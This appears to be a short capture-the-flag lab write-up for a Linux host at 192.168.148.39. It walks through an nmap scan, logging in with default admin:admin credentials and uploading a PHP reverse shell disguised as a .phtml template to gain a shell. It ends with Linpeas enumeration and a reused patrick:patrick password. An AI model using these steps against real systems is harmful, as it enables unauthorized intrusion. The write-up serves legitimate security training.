`nmap -A -T4 -p- 192.168.148.39`
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s
```

# HTTP
Basic Authentication

Default credentials `admin:admin` worked. That means we can use this [POC](https://www.exploit-db.com/exploits/48891) additional information on this [Github](https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c)lets try and get it to work.

`cp /usr/share/seclists/Web-Shells/php-reverse-shell.php .` and adjust the files target IP and port.

Make it a phtml based on the poc `cp php-reverse-shell.php phpshell.phtml`

Upload that via the templates and start a listener.

Navigate and execute the file `http://192.168.148.39/skins/`

![](Images/Pasted%20image%2020250503135831.png)

Grab the local.txt file

![](Images/Pasted%20image%2020250503135858.png)

# Post Exploitation

Copy Linpeas over and execute it. Nothing really stuck out but I could read /etc/passwd for finding the new user patrick.

Nothing stood out in terms of files, but since the account `admin:admin` was reused I attempted `patrick:patrick` and that worked.

![](Images/Pasted%20image%2020250503141235.png)

![](Images/Pasted%20image%2020250503141412.png)










